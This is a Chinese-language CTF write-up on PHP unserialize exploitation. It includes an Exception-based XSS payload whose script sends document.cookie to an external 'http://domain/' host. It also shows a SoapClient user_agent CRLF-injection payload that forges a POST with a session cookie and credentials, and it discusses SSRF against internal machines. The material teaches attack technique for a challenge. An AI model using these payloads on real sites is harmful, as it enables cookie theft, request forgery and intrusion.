0x00 前言

题目代码：

<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);

此题目通过源码泄露，只有两行代码，由于存在unserialise，因此目的为反序列化。但是题目只给了两行代码，没有任何类的定义，无法进行构造POP链。

题目目的为XSS，且题目提示只需要将cookie打出来即可获取flag

题目复现

根据题目解题思路将题目代码复现，猜测服务端主要代码为

<?php
$a = unserialize($_GET['yds']);
echo $a;
if(is_object($a)){
    if(is_request_cookie()){
        setcookie("Flag","flag{xxx}");
    }
}else{
    echo "gungungun";
}

is_request_cookie()函数判断序列化后内容是否进行请求cookie

可以看到代码将序列化的内容进行echo，因此可以判断调用了__toString()魔术方法，__toString()在XSS处常用的原生类有Error（使用于PHP7）和Exception（适用于PHP5/PHP7）。

题目环境使用的是PHP5，故使用Exception进行反序列化，题目要求只需将cookie打出来即可，因此payload为：

<?php
    $a = new Exception("<script>window.location.href='http://domain/?'+document.cookie</script>");
    echo urlencode(serialize($a));
?>
http://IP/?yds={生成的payload}

0x01 反序列化

回顾一下PHP的魔术方法：

__construct()(构造函数)：在对象创建时调用

__destruct()(析构函数)：在对象销毁时调用

__toString()：在对象被当做字符串时自动被调用

__sleep()：将对象序列化时调用

__wakeup：将字符串反序列化为对象时调用

__call()：当调用一个对象中的不能用的方法的时调用

关于soap

SOAP是基于 XML 的简易协议，可使应用程序在HTTP之上进行信息交换。

简单地说：SOAP是用于访问网络服务的协议。

一个soap请求实例,此请求有一个 StockName 参数，而在响应中则会返回一个 Price 参数。此功能的命名空间被定义在此地址中：http://www.example.org/stock：

 POST /InStock HTTP/1.1
 Host: www.example.org
 Content-Type: application/soap+xml; charset=utf-8
 Content-Length: nnn
 <?xml version="1.0"?>
 <soap:Envelope
 xmlns:soap="http://www.w3.org/2001/12/soap-envelope"
 soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding">
 <soap:Body xmlns:m="http://www.example.org/stock">

 </soap:Envelope>

CRLF

成因查看官方文档：

public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )

其中可以看到有一个User-Agent，我们可以自定义User-Agent

我们可以看到上边soap的数据包，在User-Agent下边的http header有Content-Type为和Content-Length如果我们想要进行CRLF注入，则要控制这两个字段

因此我们可以利用SoapClient利用CRLF发送如下post请求：

$payload = new SoapClient(null,array('user_agent'=>"test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:45\r\n\r\nusername=admin&password=nu1ladmin&code=470837\r\n\r\n\r\n",'location'=>$location,
'uri'=>$uri));

从而造成CRLF攻击

组合拳

既然可以进行CRLF注入，假设我们可以调用soap，目标是内网主机，那么我们就可以在外网利用CRLF进行SQL注入、命令执行等手法攻击内网机器，造成了SSRF。
